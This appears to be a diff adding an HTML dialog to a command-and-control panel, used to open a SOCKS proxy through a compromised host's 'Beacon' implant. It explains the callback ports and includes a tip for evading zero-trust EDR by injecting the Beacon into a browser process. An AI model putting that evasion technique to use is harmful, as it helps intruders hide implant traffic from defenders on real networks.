@@ -1,0 +1,92 @@
+<!-- socks-proxy 模态框 - 从 1index.html 自动提取 -->
+<div id="socksProxyModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden items-center justify-center z-50">
+    <div class="bg-gray-800 rounded-xl border border-gray-700 w-full max-w-2xl mx-4 shadow-2xl">
+        <div class="flex items-center justify-between p-6 border-b border-gray-700">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 bg-orange-500/20 rounded-lg flex items-center justify-center">
+                    <i class="fas fa-network-wired text-orange-400"></i>
+                </div>
+                <h3 class="text-xl font-bold text-white">SOCKS代理连接</h3>
+            </div>
+            <button onclick="window.closeSocksProxyModal()" class="text-gray-400 hover:text-white transition-colors">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+        </div>
+
+        <div class="p-6">
+            <div class="bg-gray-900/50 rounded-lg p-6 border border-gray-700 mb-6">
+                <div class="space-y-4">
+                    <!-- 当前Beacon信息 -->
+                    <div class="bg-orange-500/10 rounded-lg p-4 border border-orange-500/20">
+                        <div class="flex items-center space-x-2 mb-2">
+                            <i class="fas fa-satellite text-orange-400"></i>
+                            <span class="text-sm font-semibold text-orange-400">当前Beacon</span>
+                        </div>
+                        <div id="socksProxyBeaconInfo" class="text-sm text-gray-300">
+                            请先选择一个Beacon
+                        </div>
+                    </div>
+
+                    <!-- Available reverse proxies quick-select -->
+                    <div id="socksProxyAvailableProxies" class="hidden">
+                        <label class="block text-sm font-medium text-gray-300 mb-2">
+                            <i class="fas fa-list-ul mr-2 text-cyan-400"></i>可用的反向代理（点击自动填入 Transfer 地址）
+                        </label>
+                        <div id="socksProxyProxyList" class="space-y-2 max-h-40 overflow-y-auto"></div>
+                    </div>
+
+                    <!-- 代理服务器地址 -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">
+                            <i class="fas fa-server mr-2 text-orange-400"></i>代理服务器地址
+                        </label>
+                        <input type="text" id="socksProxyAddress"
+                               placeholder="例如: 192.168.1.100:8080"
+                               class="w-full bg-gray-700 border border-gray-600 text-white rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-orange-500 font-mono">
+                        <div id="socksProxyAddressHint" class="mt-2">
+                            <p class="text-xs text-gray-500">
+                                <i class="fas fa-info-circle mr-1"></i>
+                                格式：IP地址:端口 — Beacon 应连接 <strong class="text-yellow-400">Transfer 端口</strong>（非 SOCKS5 监听端口）
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Port explanation -->
+                    <div class="bg-blue-500/10 rounded-lg p-3 border border-blue-500/20">
+                        <div class="flex items-start space-x-2">
+                            <i class="fas fa-exclamation-triangle text-yellow-400 mt-0.5"></i>
+                            <div class="text-xs text-gray-300 leading-relaxed">
+                                <p class="font-semibold text-yellow-400 mb-1">⚠ 端口说明</p>
+                                <p><span class="text-cyan-400">SOCKS5 端口</span>：用户侧代理入口（如 proxychains 配置的端口），<strong>不要</strong>让 Beacon 连接此端口。</p>
+                                <p><span class="text-green-400">Transfer 端口</span>：Beacon/Slave 回连端口，<strong>必须</strong>让 Beacon 连接此端口。</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- iOA/EDR bypass tip -->
+                    <div class="bg-amber-500/10 rounded-lg p-3 border border-amber-500/20">
+                        <div class="flex items-start space-x-2">
+                            <i class="fas fa-shield-alt text-amber-400 mt-0.5"></i>
+                            <div class="text-xs text-gray-300 leading-relaxed">
+                                <p class="font-semibold text-amber-400 mb-1">🛡️ iOA / 零信任 EDR 绕过提示</p>
+                                <p>如果目标安装了 iOA 等零信任 EDR，Beacon 进程的网络访问可能被拦截。</p>
+                                <p class="mt-1"><strong class="text-green-400">解决方案：</strong>先将 Beacon 注入到<strong class="text-cyan-400">浏览器进程</strong>（如 msedge.exe / chrome.exe），
+                                然后在注入后的新 Beacon 上执行 socks5 命令。浏览器是 EDR 白名单进程，网络访问不会被限制。</p>
+                                <p class="mt-1 text-gray-500">→ 前往 <strong>代理管理</strong> 页面的 <strong class="text-amber-400">EDR 绕过向导</strong> 获取引导式操作流程。</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="flex items-center justify-end space-x-3 p-6 border-t border-gray-700">
+            <button onclick="window.closeSocksProxyModal()" class="px-6 py-2.5 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
+                取消
+            </button>
+            <button onclick="window.sendSocksProxyCommand()" class="px-6 py-2.5 bg-orange-500 hover:bg-orange-600 text-white rounded-lg transition-colors flex items-center">
+                <i class="fas fa-play mr-2"></i>建立连接
+            </button>
+        </div>
+    </div>
+</div>
